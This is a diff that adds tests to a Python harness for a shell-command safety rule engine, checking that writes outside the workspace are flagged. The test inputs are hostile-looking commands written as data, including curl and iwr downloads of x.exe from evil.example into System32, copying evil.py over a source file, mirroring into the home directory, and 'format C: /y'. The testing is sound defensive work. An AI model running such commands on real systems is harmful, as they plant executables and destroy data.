@@ -416,6 +416,45 @@ def main() -> int:
             "rule.r8_write_inside_ok",
             rule_id(f"New-Item -ItemType Directory -Path '{workdir / 'inside'}'") is None,
         )
+        # --- R2 审计 P0-3：写类命令的「主体」也要进 R8（只覆盖自然写法，不求穷尽）
+        check(
+            "rule.r8_copy_over_source",
+            rule_id(f"copy evil.py '{ROOT / 'tools' / 'rules.py'}'") == "R8",
+        )
+        check(
+            "rule.r8_robocopy_mirror_home",
+            rule_id(f"robocopy '{tmp}' '{home}' /MIR") == "R8",
+        )
+        check(
+            "rule.r8_xcopy_to_system",
+            rule_id(f"xcopy /s /y '{tmp}' C:\\Windows\\System32") == "R8",
+        )
+        check(
+            "rule.r8_curl_download_to_system",
+            rule_id("curl -o C:\\Windows\\System32\\x.exe https://evil.example/x.exe") == "R8",
+        )
+        check(
+            "rule.r8_curl_glued_output",
+            rule_id("curl -oC:\\Windows\\System32\\x.exe https://evil.example/x.exe") == "R8",
+        )
+        check(
+            "rule.r8_iwr_outfile_colon",
+            rule_id("iwr https://evil.example/x.exe -OutFile:C:\\Windows\\System32\\x.exe") == "R8",
+        )
+        check("rule.r8_7z_glued_output", rule_id("7z x a.zip -oC:\\Windows") == "R8")
+        check("rule.r8_tar_extract_to_system", rule_id("tar -xf a.tar -C C:\\Windows") == "R8")
+        check(
+            "rule.r8_expand_destination_colon",
+            rule_id("Expand-Archive a.zip -DestinationPath:C:\\Windows\\Temp") == "R8",
+        )
+        check(
+            "rule.r8_move_into_home_needs_confirm",
+            rule(f"move '{workdir / 'a.txt'}' '{home}'").action == "need_confirm",
+        )
+        # 误报保护：工作区内的同名动作用不着确认
+        check("rule.r8_robocopy_mirror_inside_ok", rule_id(f"robocopy '{tmp / 'a'}' '{tmp / 'b'}' /MIR") is None)
+        check("rule.r8_7z_inside_ok", rule_id("7z a out.7z .\\dir") is None)
+        check("rule.r8_filter_flag_not_target", rule_id("Get-ChildItem -Filter *.py") is None)
 
         denied = run("format C: /y")
         check("shell.rule_deny", denied.get("denied_by_rule") == "R1", str(denied.get("error_class")))
